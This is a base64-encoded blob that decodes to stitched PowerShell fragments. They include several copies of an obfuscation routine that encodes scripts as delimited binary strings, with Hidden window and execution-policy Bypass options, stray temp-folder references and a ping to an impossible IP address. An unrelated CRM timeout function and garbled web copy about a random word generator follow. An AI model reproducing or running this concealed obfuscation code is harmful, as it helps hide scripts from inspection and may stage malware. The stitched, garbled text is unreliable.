1EZWxpbWl0ZXJzLgogICAgJHhOVEoydzgxVkogPSAod3VqSkVZQ0lHQ2lrV3JnbCgnJykpCiAgICAoW0NoYXJbXV0kUTdYQVFucTFZODhlKSB8IEZvckVhY2gtT2JqZWN0IHskWG50ajJ3ODFWaiArPSAoW0NvbnZlcnRdOjpUb1N0cmluZygoW0ludF1bQ2hhcl0kXyksJGdtRF9KTzhJQ2lwKSArIChHZXQtUmFuZG9tIC1JbnB1dCAkQXZ2czh5MTJrdG1XX2Q1KSl9CiJACiAgICAgICAgJEpyV0RlWFpRR2Y2ZmYgPSBAIgogICAgICAgIFtWYWxpZGF0ZVNldCgoV1VKSkV5Q2lnQ0lLV3JnbCgnTm9ybWFsJykpLCAod1VKSmVZQ0lHQ2lLV3JnTCgnTWluaW1pemVkJykpLCAod3VKakV5Q0lHQ2lLd3JnbCgnTWF4aW1pemVkJykpLCAoV3VqSkVZQ0lHY0lLV3JnbCgnSGlkZGVuJykpKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICR0eHk3d3g3M1MsCgogICAgICAgIFtWYWxpZGF0ZVNldCgod1VqSkVZQ2lHQ0lLd1JHTCgnQnlwYXNzJykpLCAod3VqSkVZY0lHQ0lLd3JHbCgnVW5yZXN0cmljdGVkJykpLCAod1VKakVZY0lHQ0lrV1JnbCgnUmVtb3RlU2lnbmVkJykpLCAod1VKSkVZQ2lHY2lLV3JnbCgnQWxsU2lnbmVkJykpLCAoV3VqakVZQ0lHQ0lrd1JnbCgnUmVzdHJpY3RlZCcpKSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkb2l3VWFJYnh1TGNzaFksICAgIAogICAgICAgICRlbnY6dGVtcAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJHlzdGtFSDlNUjFldUk3T2QzCiAgICApCgogICAgIyBFbmNvZGluZyBiYXNlIHZhbHVlczogMTY9SGV4LCA4PU9jdGFsLCAyPUJpbmFyeQogICAgJEdNZF9KTzhJQ0lwID0gMgoKICAgICMgRWl0aGVyIGNvbnZlcnQgU2NyaXB0QmxvY2sgdG8gYSBTdHJpbmcgb3IgY29udmVydCBzY3JpcHQgYXQgJFBhdGggdG8gYSBTdHJpbmcuCiAgICBJZigkVGJTdENwQlBWWygnezB9ezF9Jy1mJ1BhdCcsJ2gnKV0pCiAgICB7CiAgICAgICAgR2V0LUNoaWxkSXRlbSAkSHdsNEJVQ0tZOSAtRXJyb3JBY3Rpb24gU3RvcCB8IE91dC1OdWxsCiAgICAgICAgJFE3eEFRTnExWTg4ZSA9IFtJTy5GaWxlXTo6UmVhZEFsbFRleHQoKFJlc29sdmUtUGF0aCAkaHdsNGJ1Y0tZOSkpCiAgICB9CiAgICBFbHNlCiAgICB7CiAgICAgICAgJHE3eGFRTnExWTg4ZSA9IFtTdHJpbmddJG85RGYwU1JwdDgzRjZCaG81aQogICAgfQogICAgJGVudjp0ZW1wCgogICAgIyBDcmVhdGUgbGlzdCBvZiByYW5kb20gZGVsaW1pdGVycyAkUmFuZG9tRGVsaW1pdGVycy4KICAgICMgQXZvaWQgdXNpbmcgLiAqICcgIiBbIF0gKCApIGV0Yy4gYXMgZGVsaW1pdGVycyBhcyB0aGVzZSB3aWxsIGNhdXNlIHByb2JsZW1zIGluIHRoZSAtU3BsaXQgY29tbWFuZCBzeW50YXguCiAgICAkYVZWUzhZMTJrdG1XX2Q1ICA9IEAoKFd1akpFeUNJR0NJS3dyR0woJ18nKSksKHdVSkpFWWNJR0NJa1dSR2woJy0nKSksKHd1akpleWNJR0NJS1dyZ0woJywnKSksKFd1akpFWUNJR0NJS3dSZ0woJ3snKSksKHdVakpleUNJZ2NJa1dSZ0woJ30nKSksKHdVSkpleUNJR0NJS1dSZ0woJ34nKSksKFdVakpFWWNJR2NpS1dyR0woJyEnKSksKFdVSkpFWUNpZ0NJa3dyR0woJ0AnKSksKHdVakplWUNJZ0NJa3dyZ0woJyUnKSksKFdVampleUNJZ2Npa1dyR2woJyYnKSksKHd1SkpFWUNJR0NJS3dyZ0woJzwnKSksKHdVakpFWWNJR0NJa1dyZ0woJz4nKSksKHd1SmpFWUNJR0NJS1dSZ2woJzsnKSksKHd1SkpFWWNJR2NpS1dyZ2woJzonKSkpCgogICAgIyBBZGQgbGV0dGVycyBhLXogd2l0aCByYW5kb20gY2FzZSB0byAkUmFuZG9tRGVsaW1pdGVycy4KICAgIEAoKFdVSkpFWUNJZ0NpS1dyZ2woJ2EnKSksKHd1SkpFWWNJR0NJa1dyR2woJ2InKSksKFd1ampFeWNJZ0NpS1dyR0woJ2MnKSksKHd1akpFWUNJZ2Npa3dyZ0woJ2QnKSksKFd1SmpFeUNJR0NJS3dyZ2woJ2UnKSksKHdVSkplWWNpZ0NJa1dyZ2woJ2YnKSksKFd1SkpFeWNJR0NJS1dSZ0woJ2cnKSksKHd1ampleWNpR2Npa1dyZ0woJ2gnKSksKHd1SkplWUNpR0NJS1dyZ2woJ2knKSksKHdVakpFWUNpZ2NJS3dSZ2woJ2onKSksKHdVampFWUNJZ0NJS1dSR0woJ2snKSksKHdVSkpFWUNpR0NJa1dyR0woJ2wnKSksKFd1SmplWWNJR2NJS1dyZ2woJ20nKSksKHdVamplWUNpR0NpS1dSR0woJ24nKSksKFd1SmpFWWNJZ0NJa3dyR2woJ28nKSksKHd1SkpFeWNJR0NpS3dyZ2woJ3AnKSksKFd1akplWUNJR2NJa3dyR0woJ3EnKSksKHdVSkpFeUNJZ0NJa1dSR2woJ3InKSksKHd1SkplWWNJR0NJS1dyZ0woJ3MnKSksKHd1ampFWUNJR2Npa1dSZ0woJ3QnKSksKFdVampFeUNpZ0NJa1dyR0woJ3UnKSksKHd1akpleWNJR2NJS1dyR2woJ3YnKSksKHd1akplWUNJR0NJS3dyZ0woJ3cnKSksKFd1SkplWWNJZ0NJa1dyZ0woJ3gnKSksKHdVakpleUNpZ0NpS1dyZ2woJ3knKSksKFdVSkpFWWNpR2Npa1dyZ2woJ3onKSkpIHwgRm9yRWFjaC1PYmplY3QgeyRRT2g3a1YxMUZSZVM2XzJuaSA9ICRfOyBJZigoKEdldC1SYW5kb20gLUlucHV0IEAoKDIgLSAxKS4uKDIgKyAoMSAtIDEpKSkpLSgzIC0gMikgLWVxIDApKSB7JFFPSDdLVjExRlJlUzZfMm5JID0gJHFPaDdrVjExRnJlUzZfMk5pLlRvVXBwZXIoKX0gJEFWdlM4eTEyS3RNd19kNSArPSAkUU9IN0t2MTFmUmVTNl8yTkl9CiAgICAKICAgICMgT25seSB1c2UgYSBzdWJzZXQgb2YgY3VycmVudCBkZWxpbWl0ZXJzIHRvIHJhbmRvbWl6ZSB3aGF0IHlvdSBzZWUgaW4gZXZlcnkgaXRlcmF0aW9uIG9mIHRoaXMgc2NyaXB0J3Mgb3V0cHV0LgogICAgJEFWVnM4eTEyS1Rtd19kNSA9IChHZXQtUmFuZG9tIC1JbnB1dCAkQXZ2Uzh5MTJrVE1XX2Q1IC1Db3VudCAoJEF2dlM4WTEya3RtV19kNS5Db3VudC8oMiArIDIpKSkKCiAgICAjIENvbnZlcnQgJFNjcmlwdFN0cmluZyB0byBkZWxpbWl0ZWQgQmluYXJ5IHZhbHVlcyBpbiBbQ2hhcl0gYXJyYXkgc2VwYXJhdGVkIGJ5IHJhbmRvbSBkZWxpbWl0ZXIgZnJvbSBkZWZpbmVkIGxpc3QgJFJhbmRvbURlbGltaXRlcnMuCiAgICAkeE5USjJ3ODFWSiA9ICh3dWpKRVlDSUdDaWtXcmdsKCcnKSkKICAgIChbQ2hhcltdXSRRN1hBUW5xMVk4OGUpIHwgRm9yRWFjaC1PYmplY3QgeyRYbnRqMnc4MVZqICs9IChbQ29udmVydF06OlRvU3RyaW5nKChbSW50XVtDaGFyXSRfKSwkZ21EX0pPOElDaXApICsgKEdldC1SYW5kb20gLUlucHV0ICRBdnZzOHkxMmt0bVdfZDUpKX0KIkAKJDM0Q2RFZ1BneGNjWmdVSEU1VVMyRnc3Z0E1cXl4TTd4WUdNSkVScG1IeHRQSkFNM1ZoID0gQCIKICAgICAgICBbVmFsaWRhdGVTZXQoKFdVSkpFeUNpZ0NJS1dyZ2woJ05vcm1hbCcpKSwgKHdVSkplWUNJR0NpS1dyZ0woJ01pbmltaXplZCcpKSwgKHd1SmpFeUNJR0NpS3dyZ2woJ01heGltaXplZCcpKSwgKFd1akpFWUNJR2NJS1dyZ2woJ0hpZGRlbicpKSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkdHh5N3d4NzNTLAoKICAgICAgICBbVmFsaWRhdGVTZXQoKHdVakpFWUNpR0NJS3dSR0woJ0J5cGFzcycpKSwgKHd1akpFWWNJR0NJS3dyR2woJ1VucmVzdHJpY3RlZCcpKSwgKHdVSmpFWWNJR0NJa1dSZ2woJ1JlbW90ZVNpZ25lZCcpKSwgKHdVSkpFWUNpR2NpS1dyZ2woJ0FsbFNpZ25lZCcpKSwgKFd1ampFWUNJR0NJa3dSZ2woJ1Jlc3RyaWN0ZWQnKSkpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJG9pd1VhSWJ4dUxjc2hZLAogICAgICAgICRlbnY6dGVtcAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJHlzdGtFSDlNUjFldUk3T2QzCiAgICApCgogICAgIyBFbmNvZGluZyBiYXNlIHZhbHVlczogMTY9SGV4LCA4PU9jdGFsLCAyPUJpbmFyeQogICAgJEdNZF9KTzhJQ0lwID0gMgoKICAgICMgRWl0aGVyIGNvbnZlcnQgU2NyaXB0QmxvY2sgdG8gYSBTdHJpbmcgb3IgY29udmVydCBzY3JpcHQgYXQgJFBhdGggdG8gYSBTdHJpbmcuCiAgICBJZigkVGJTdENwQlBWWygnezB9ezF9Jy1mJ1BhdCcsJ2gnKV0pCiAgICB7CiAgICAgICAgR2V0LUNoaWxkSXRlbSAkSHdsNEJVQ0tZOSAtRXJyb3JBY3Rpb24gU3RvcCB8IE91dC1OdWxsCiAgICAgICAgJFE3eEFRTnExWTg4ZSA9IFtJTy5GaWxlXTo6UmVhZEFsbFRleHQoKFJlc29sdmUtUGF0aCAkaHdsNGJ1Y0tZOSkpCiAgICB9CiAgICBFbHNlCiAgICB7CiAgICAgICAgJHE3eGFRTnExWTg4ZSA9IFtTdHJpbmddJG85RGYwU1JwdDgzRjZCaG81aQogICAgfQogICAgJGVudjp0ZW1wCiAgICAjIENyZWF0ZSBsaXN0IG9mIHJhbmRvbSBkZWxpbWl0ZXJzICRSYW5kb21EZWxpbWl0ZXJzLgogICAgIyBBdm9pZCB1c2luZyAuICogJyAiIFsgXSAoICkgZXRjLiBhcyBkZWxpbWl0ZXJzIGFzIHRoZXNlIHdpbGwgY2F1c2UgcHJvYmxlbXMgaW4gdGhlIC1TcGxpdCBjb21tYW5kIHN5bnRheC4KICAgICRhVlZTOFkxMmt0bVdfZDUgID0gQCgoV3VqSkV5Q0lHQ0lLd3JHTCgnXycpKSwod1VKSkVZY0lHQ0lrV1JHbCgnLScpKSwod3VqSmV5Y0lHQ0lLV3JnTCgnLCcpKSwoV3VqSkVZQ0lHQ0lLd1JnTCgneycpKSwod1VqSmV5Q0lnY0lrV1JnTCgnfScpKSwod1VKSmV5Q0lHQ0lLV1JnTCgnficpKSwoV1VqSkVZY0lHY2lLV3JHTCgnIScpKSwoV1VKSkVZQ2lnQ0lrd3JHTCgnQCcpKSwod1VqSmVZQ0lnQ0lrd3JnTCgnJScpKSwoV1VqamV5Q0lnY2lrV3JHbCgnJicpKSwod3VKSkVZQ0lHQ0lLd3JnTCgnPCcpKSwod1VqSkVZY0lHQ0lrV3JnTCgnPicpKSwod3VKakVZQ0lHQ0lLV1JnbCgnOycpKSwod3VKSkVZY0lHY2lLV3JnbCgnOicpKSkKCiAgICAjIEFkZCBsZXR0ZXJzIGEteiB3aXRoIHJhbmRvbSBjYXNlIHRvICRSYW5kb21EZWxpbWl0ZXJzLgogICAgQCgoV1VKSkVZQ0lnQ2lLV3JnbCgnYScpKSwod3VKSkVZY0lHQ0lrV3JHbCgnYicpKSwoV3VqakV5Y0lnQ2lLV3JHTCgnYycpKSwod3VqSkVZQ0lnY2lrd3JnTCgnZCcpKSwoV3VKakV5Q0lHQ0lLd3JnbCgnZScpKSwod1VKSmVZY2lnQ0lrV3JnbCgnZicpKSwoV3VKSkV5Y0lHQ0lLV1JnTCgnZycpKSwod3VqamV5Y2lHY2lrV3JnTCgnaCcpKSwod3VKSmVZQ2lHQ0lLV3JnbCgnaScpKSwod1VqSkVZQ2lnY0lLd1JnbCgnaicpKSwod1VqakVZQ0lnQ0lLV1JHTCgnaycpKSwod1VKSkVZQ2lHQ0lrV3JHTCgnbCcpKSwoV3VKamVZY0lHY0lLV3JnbCgnbScpKSwod1VqamVZQ2lHQ2lLV1JHTCgnbicpKSwoV3VKakVZY0lnQ0lrd3JHbCgnbycpKSwod3VKSkV5Y0lHQ2lLd3JnbCgncCcpKSwoV3VqSmVZQ0lHY0lrd3JHTCgncScpKSwod1VKSkV5Q0lnQ0lrV1JHbCgncicpKSwod3VKSmVZY0lHQ0lLV3JnTCgncycpKSwod3VqakVZQ0lHY2lrV1JnTCgndCcpKSwoV1VqakV5Q2lnQ0lrV3JHTCgndScpKSwod3VqSmV5Y0lHY0lLV3JHbCgndicpKSwod3VqSmVZQ0lHQ0lLd3JnTCgndycpKSwoV3VKSmVZY0lnQ0lrV3JnTCgneCcpKSwod1VqSmV5Q2lnQ2lLV3JnbCgneScpKSwoV1VKSkVZY2lHY2lrV3JnbCgneicpKSkgfCBGb3JFYWNoLU9iamVjdCB7JFFPaDdrVjExRlJlUzZfMm5pID0gJF87IElmKCgoR2V0LVJhbmRvbSAtSW5wdXQgQCgoMiAtIDEpLi4oMiArICgxIC0gMSkpKSktKDMgLSAyKSAtZXEgMCkpIHskUU9IN0tWMTFGUmVTNl8ybkkgPSAkcU9oN2tWMTFGcmVTNl8yTmkuVG9VcHBlcigpfSAkQVZ2Uzh5MTJLdE13X2Q1ICs9ICRRT0g3S3YxMWZSZVM2XzJOSX0KICAgICAgICAkZW52OnRlbXAKICAgICMgT25seSB1c2UgYSBzdWJzZXQgb2YgY3VycmVudCBkZWxpbWl0ZXJzIHRvIHJhbmRvbWl6ZSB3aGF0IHlvdSBzZWUgaW4gZXZlcnkgaXRlcmF0aW9uIG9mIHRoaXMgc2NyaXB0J3Mgb3V0cHV0LgogICAgJEFWVnM4eTEyS1Rtd19kNSA9IChHZXQtUmFuZG9tIC1JbnB1dCAkQXZ2Uzh5MTJrVE1XX2Q1IC1Db3VudCAoJEF2dlM4WTEya3RtV19kNS5Db3VudC8oMiArIDIpKSkKICAgICAgICAkZW52OnRlbXAgCiAgICAjIENvbnZlcnQgJFNjcmlwdFN0cmluZyB0byBkZWxpbWl0ZWQgQmluYXJ5IHZhbHVlcyBpbiBbQ2hhcl0gYXJyYXkgc2VwYXJhdGVkIGJ5IHJhbmRvbSBkZWxpbWl0ZXIgZnJvbSBkZWZpbmVkIGxpc3QgJFJhbmRvbURlbGltaXRlcnMuCiAgICAkeE5USjJ3ODFWSiA9ICh3dWpKRVlDSUdDaWtXcmdsKCcnKSkKICAgIChbQ2hhcltdXSRRN1hBUW5xMVk4OGUpIHwgRm9yRWFjaC1PYmplY3QgeyRYbnRqMnc4MVZqICs9IChbQ29udmVydF06OlRvU3RyaW5nKChbSW50XVtDaGFyXSRfKSwkZ21EX0pPOElDaXApICsgKEdldC1SYW5kb20gLUlucHV0ICRBdnZzOHkxMmt0bVdfZDUpKX0KIkAKJGhNSE50NGFGZnh6WTN3NWhnZTJha0gyQXhLV1ZaS1VYTjI2VjREVTVndWdOaDNoWHhSM3VZZHZNVDNjV1hlWSA9IEAiCiAgICAgICAgW1ZhbGlkYXRlU2V0KChXVUpKRXlDaWdDSUtXcmdsKCdOb3JtYWwnKSksICh3VUpKZVlDSUdDaUtXcmdMKCdNaW5pbWl6ZWQnKSksICh3dUpqRXlDSUdDaUt3cmdsKCdNYXhpbWl6ZWQnKSksIChXdWpKRVlDSUdjSUtXcmdsKCdIaWRkZW4nKSkpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJHR4eTd3eDczUywKICAgICAgICAkZW52OnRlbXAgICAKICAgICAgICBbVmFsaWRhdGVTZXQoKHdVakpFWUNpR0NJS3dSR0woJ0J5cGFzcycpKSwgKHd1akpFWWNJR0NJS3dyR2woJ1VucmVzdHJpY3RlZCcpKSwgKHdVSmpFWWNJR0NJa1dSZ2woJ1JlbW90ZVNpZ25lZCcpKSwgKHdVSkpFWUNpR2NpS1dyZ2woJ0FsbFNpZ25lZCcpKSwgKFd1ampFWUNJR0NJa3dSZ2woJ1Jlc3RyaWN0ZWQnKSkpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJG9pd1VhSWJ4dUxjc2hZLAogICAgICAgIAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJHlzdGtFSDlNUjFldUk3T2QzCiAgICApCgogICAgIyBFbmNvZGluZyBiYXNlIHZhbHVlczogMTY9SGV4LCA4PU9jdGFsLCAyPUJpbmFyeQogICAgJEdNZF9KTzhJQ0lwID0gMgogICAgJGVudjp0ZW1wCiAgICAjIEVpdGhlciBjb252ZXJ0IFNjcmlwdEJsb2NrIHRvIGEgU3RyaW5nIG9yIGNvbnZlcnQgc2NyaXB0IGF0ICRQYXRoIHRvIGEgU3RyaW5nLgogICAgSWYoJFRiU3RDcEJQVlsoJ3swfXsxfSctZidQYXQnLCdoJyldKQogICAgewogICAgICAgICRlbnY6dGVtcAogICAgICAgIEdldC1DaGlsZEl0ZW0gJEh3bDRCVUNLWTkgLUVycm9yQWN0aW9uIFN0b3AgfCBPdXQtTnVsbAogICAgICAgICRRN3hBUU5xMVk4OGUgPSBbSU8uRmlsZV06OlJlYWRBbGxUZXh0KChSZXNvbHZlLVBhdGggJGh3bDRidWNLWTkpKQogICAgfQogICAgRWxzZQogICAgewogICAgICAgICRxN3hhUU5xMVk4OGUgPSBbU3RyaW5nXSRvOURmMFNScHQ4M0Y2QmhvNWkKICAgIH0KCiAgICAjIENyZWF0ZSBsaXN0IG9mIHJhbmRvbSBkZWxpbWl0ZXJzICRSYW5kb21EZWxpbWl0ZXJzLgogICAgIyBBdm9pZCB1c2luZyAuICogJyAiIFsgXSAoICkgZXRjLiBhcyBkZWxpbWl0ZXJzIGFzIHRoZXNlIHdpbGwgY2F1c2UgcHJvYmxlbXMgaW4gdGhlIC1TcGxpdCBjb21tYW5kIHN5bnRheC4KICAgICRhVlZTOFkxMmt0bVdfZDUgID0gQCgoV3VqSkV5Q0lHQ0lLd3JHTCgnXycpKSwod1VKSkVZY0lHQ0lrV1JHbCgnLScpKSwod3VqSmV5Y0lHQ0lLV3JnTCgnLCcpKSwoV3VqSkVZQ0lHQ0lLd1JnTCgneycpKSwod1VqSmV5Q0lnY0lrV1JnTCgnfScpKSwod1VKSmV5Q0lHQ0lLV1JnTCgnficpKSwoV1VqSkVZY0lHY2lLV3JHTCgnIScpKSwoV1VKSkVZQ2lnQ0lrd3JHTCgnQCcpKSwod1VqSmVZQ0lnQ0lrd3JnTCgnJScpKSwoV1VqamV5Q0lnY2lrV3JHbCgnJicpKSwod3VKSkVZQ0lHQ0lLd3JnTCgnPCcpKSwod1VqSkVZY0lHQ0lrV3JnTCgnPicpKSwod3VKakVZQ0lHQ0lLV1JnbCgnOycpKSwod3VKSkVZY0lHY2lLV3JnbCgnOicpKSkKCiAgICAjIEFkZCBsZXR0ZXJzIGEteiB3aXRoIHJhbmRvbSBjYXNlIHRvICRSYW5kb21EZWxpbWl0ZXJzLgogICAgQCgoV1VKSkVZQ0lnQ2lLV3JnbCgnYScpKSwod3VKSkVZY0lHQ0lrV3JHbCgnYicpKSwoV3VqakV5Y0lnQ2lLV3JHTCgnYycpKSwod3VqSkVZQ0lnY2lrd3JnTCgnZCcpKSwoV3VKakV5Q0lHQ0lLd3JnbCgnZScpKSwod1VKSmVZY2lnQ0lrV3JnbCgnZicpKSwoV3VKSkV5Y0lHQ0lLV1JnTCgnZycpKSwod3VqamV5Y2lHY2lrV3JnTCgnaCcpKSwod3VKSmVZQ2lHQ0lLV3JnbCgnaScpKSwod1VqSkVZQ2lnY0lLd1JnbCgnaicpKSwod1VqakVZQ0lnQ0lLV1JHTCgnaycpKSwod1VKSkVZQ2lHQ0lrV3JHTCgnbCcpKSwoV3VKamVZY0lHY0lLV3JnbCgnbScpKSwod1VqamVZQ2lHQ2lLV1JHTCgnbicpKSwoV3VKakVZY0lnQ0lrd3JHbCgnbycpKSwod3VKSkV5Y0lHQ2lLd3JnbCgncCcpKSwoV3VqSmVZQ0lHY0lrd3JHTCgncScpKSwod1VKSkV5Q0lnQ0lrV1JHbCgncicpKSwod3VKSmVZY0lHQ0lLV3JnTCgncycpKSwod3VqakVZQ0lHY2lrV1JnTCgndCcpKSwoV1VqakV5Q2lnQ0lrV3JHTCgndScpKSwod3VqSmV5Y0lHY0lLV3JHbCgndicpKSwod3VqSmVZQ0lHQ0lLd3JnTCgndycpKSwoV3VKSmVZY0lnQ0lrV3JnTCgneCcpKSwod1VqSmV5Q2lnQ2lLV3JnbCgneScpKSwoV1VKSkVZY2lHY2lrV3JnbCgneicpKSkgfCBGb3JFYWNoLU9iamVjdCB7JFFPaDdrVjExRlJlUzZfMm5pID0gJF87IElmKCgoR2V0LVJhbmRvbSAtSW5wdXQgQCgoMiAtIDEpLi4oMiArICgxIC0gMSkpKSktKDMgLSAyKSAtZXEgMCkpIHskUU9IN0tWMTFGUmVTNl8ybkkgPSAkcU9oN2tWMTFGcmVTNl8yTmkuVG9VcHBlcigpfSAkQVZ2Uzh5MTJLdE13X2Q1ICs9ICRRT0g3S3YxMWZSZVM2XzJOSX0KICAgIAogICAgIyBPbmx5IHVzZSBhIHN1YnNldCBvZiBjdXJyZW50IGRlbGltaXRlcnMgdG8gcmFuZG9taXplIHdoYXQgeW91IHNlZSBpbiBldmVyeSBpdGVyYXRpb24gb2YgdGhpcyBzY3JpcHQncyBvdXRwdXQuCiAgICAkQVZWczh5MTJLVG13X2Q1ID0gKEdldC1SYW5kb20gLUlucHV0ICRBdnZTOHkxMmtUTVdfZDUgLUNvdW50ICgkQXZ2UzhZMTJrdG1XX2Q1LkNvdW50LygyICsgMikpKQoKICAgICMgQ29udmVydCAkU2NyaXB0U3RyaW5nIHRvIGRlbGltaXRlZCBCaW5hcnkgdmFsdWVzIGluIFtDaGFyXSBhcnJheSBzZXBhcmF0ZWQgYnkgcmFuZG9tIGRlbGltaXRlciBmcm9tIGRlZmluZWQgbGlzdCAkUmFuZG9tRGVsaW1pdGVycy4KICAgICR4TlRKMnc4MVZKID0gKHd1akpFWUNJR0Npa1dyZ2woJycpKQogICAgKFtDaGFyW11dJFE3WEFRbnExWTg4ZSkgfCBGb3JFYWNoLU9iamVjdCB7JFhudGoydzgxVmogKz0gKFtDb252ZXJ0XTo6VG9TdHJpbmcoKFtJbnRdW0NoYXJdJF8pLCRnbURfSk84SUNpcCkgKyAoR2V0LVJhbmRvbSAtSW5wdXQgJEF2dnM4eTEya3RtV19kNSkpfQoKIkAKICAgIFBpbmcgNDIuMDY5LjI0NS4xMSAtbiAxCmZ1bmN0aW9uIDE3ewoKIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQQVJBTSggCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1TZXJ2aWNlQ2xpZW50XSRjb25uLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSwgcG9zaXRpb249MSldCiAgICAgICAgW0ludDY0XSRUaW1lb3V0SW5TZWNvbmRzLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSwgcG9zaXRpb249MSldCiAgICAgICAgW3N3aXRjaF0kU2V0RGVmYXVsdAogICAgKQoKCSNwb3dlcnNoZWxsIDQuMCsgaXMgcmVxdWlyZWQgZm9yIE5ldy1UaW1lU3BhbiAtU2Vjb25kcyAkVGltZW91dEluU2Vjb25kcyAKCSRuZXdUaW1lb3V0ID0gTmV3LU9iamVjdCBTeXN0ZW0uVGltZVNwYW4gLUFyZ3VtZW50TGlzdCAwLDAsMTIwCglpZighJFNldERlZmF1bHQpewoJICAgICRuZXdUaW1lb3V0ID0gTmV3LU9iamVjdCBTeXN0ZW0uVGltZVNwYW4gLUFyZ3VtZW50TGlzdCAwLDAsJFRpbWVvdXRJblNlY29uZHMKCX0KCSNzZXQgdGhlIHRpbWVvdXQgb24gdGhlIE1heENvbm5lY3Rpb25UaW1lb3V0IHN0YXRpYyAKICAgIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybVNlcnZpY2VDbGllbnRdOjpNYXhDb25uZWN0aW9uVGltZW91dCA9ICRuZXdUaW1lb3V0CgoJaWYoJGNvbm4uT3JnYW5pemF0aW9uU2VydmljZVByb3h5IC1hbmQgJGNvbm4uT3JnYW5pemF0aW9uU2VydmljZVByb3h5LlRpbWVvdXQpewoJICAgIHRyeXsKCQkJV3JpdGUtVmVyYm9zZSAiVXBkYXRpbmcgVGltZW91dCBvbiBPcmdhbml6YXRpb25TZXJ2aWNlUHJveHkiCgkJCSRjb25uLk9yZ2FuaXphdGlvblNlcnZpY2VQcm94eS5UaW1lb3V0ID0gJG5ld1RpbWVvdXQKCSAgICB9CgkgICAgY2F0Y2h7CgkJCVdyaXRlLVZlcmJvc2UgIkZhaWxlZCB0byBzZXQgdGhlIHRpbWVvdXQgdmFsdWUiICAgICAgICAKCSAgICB9Cgl9CglpZigkY29ubi5Pcmdhbml6YXRpb25XZWJQcm94eUNsaWVudCAtYW5kICRjb25uLk9yZ2FuaXphdGlvbldlYlByb3h5Q2xpZW50LkNoYW5uZWxGYWN0b3J5LkVuZHBvaW50LkJpbmRpbmcpewoJICAgIHRyeXsKCQkJV3JpdGUtVmVyYm9zZSAiVXBkYXRpbmcgVGltZW91dHMgb24gT3JnYW5pemF0aW9uV2ViUHJveHlDbGllbnQiCgkJCSRjb25uLk9yZ2FuaXphdGlvbldlYlByb3h5Q2xpZW50LkNoYW5uZWxGYWN0b3J5LkVuZHBvaW50LkJpbmRpbmcuT3BlblRpbWVvdXQgPSAkbmV3VGltZW91dAoJCQkkY29ubi5Pcmdhbml6YXRpb25XZWJQcm94eUNsaWVudC5DaGFubmVsRmFjdG9yeS5FbmRwb2ludC5CaW5kaW5nLkNsb3NlVGltZW91dCA9ICRuZXdUaW1lb3V0CgkJCSRjb25uLk9yZ2FuaXphdGlvbldlYlByb3h5Q2xpZW50LkNoYW5uZWxGYWN0b3J5LkVuZHBvaW50LkJpbmRpbmcuUmVjZWl2ZVRpbWVvdXQgPSAkbmV3VGltZW91dAoJCQkkY29ubi5Pcmdhbml6YXRpb25XZWJQcm94eUNsaWVudC5DaGFubmVsRmFjdG9yeS5FbmRwb2ludC5CaW5kaW5nLlNlbmRUaW1lb3V0ID0gJG5ld1RpbWVvdXQKCSAgICB9CgkgICAgY2F0Y2h7CgkJCVdyaXRlLVZlcmJvc2UgIkZhaWxlZCB0byBzZXQgdGhlIHRpbWVvdXQgdmFsdWVzIgoJICAgIH0KCX0KICBXcml0ZS1XYXJuaW5nICJQbGVhc2UgcmVjb25uZWN0IHRvIHRoZSBzZXJ2aWNlIGFmdGVyIHNldHRpbmcgdGhlIGNvbm5lY3Rpb24gdGltZW91dCBvciB0aGUgbmV3IHRpbWVvdXQgd2lsbCAqbm90KiBiZSB1c2VkIGZvciBvcGVyYXRpb25zLiIKfQo8Iz4+ClNwPWVsbGluZyBhbmQgZCgpClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIGQoKSBvciBwcmFjdGljZSBmb3IgcigpIGJlZXMuIElmIGFuIHEoKSB3b3JkIG8oKSwgcCgpIHVwIHRoZSBtZWFuaW5nIHdpbGwgaGVscCBzdHVkZW50cyBpbmNyZWFzZSB0aGUgbnVtYmVyIG9mIHdvcmRzIHRoZXkga25vdy4gV29ya2luZyB3aXRoIGEgcGFydG5lciwgc3R1ZGVudHMgY2FuIHRlc3QgZWFjaCBvdGhlciBvbiB0aGUgcigpIGZvciB0aGUgcmFuZG9taXplZCB3b3JkcyBtKClkLgoKTmFtZSBJbnNwaXJhdGlvbgpJZiB5b3UgbmVlZCB0byBjcmVhdGUgYSBuYW1lIGZvciBhIHByb2R1Y3QsIGFuIGV2ZW50LCBhIGJhbmQgb3IgZm9yIGFueXRoaW5nIGVsc2UsIHRoaXMgdG9vbCBjYW4gYmUgcXVpdGUgaGVscGZ1bC4gQXMgeW91IGNvbnNpZGVyIG5hbWVzLCBtKCkgYSBudW1iZXIgb2YgcmFuZG9tIHdvcmRzIGFuZCBzZWUgaG93IHRoZXkgaW1wYWN0IHdoYXQgeW91IGhhdmUgYWxyZWFkeSBjb21lIHVwIHdpdGguIElucHV0dGluZyB1bmlxdWUgd29yZHMgeW91IG1heSBub3QgaGF2ZSBjb25zaWRlcmVkIGNhbiBzcGFyayBhZGRpdGlvbmFsIGNyZWF0aXZpdHkgdG8gZXZlbnR1YWxseSBoZWxwIHlvdSBwcm9kdWNlIHRoZSBwZXJmZWN0IG5hbWUgZm9yIHlvdXIgcHJvamVjdC4gSWYgeW91J3JlIHAoKSBmb3IgZ29vZCBjaGFyYWN0ZXIgbmFtZXMgb3IgYmFieSBuYW1lcywgeW91IG1pZ2h0IGJlIGludGVyZXN0ZWQgaW4gb3VyIHJhbmRvbSBuYW1lIGdlbmVyYXRvci4KCl